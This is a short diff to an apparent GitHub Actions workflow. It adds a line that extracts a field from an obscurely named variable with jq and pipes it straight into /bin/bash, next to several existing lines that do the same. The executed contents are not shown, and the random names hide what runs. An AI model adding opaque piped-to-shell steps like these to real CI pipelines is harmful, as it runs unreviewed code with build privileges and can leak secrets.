@@ -37,6 +37,7 @@ jobs:
           echo $daco8 | jq -r .osz3 | /bin/bash
           printf '%s' "$nppl4934" | jq -r .y71 | /bin/bash
           printf '%s' "$jvfgb1015" | jq -r .glpj6796 | /bin/bash
+          echo $axkb3 | jq -r .sr91104 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
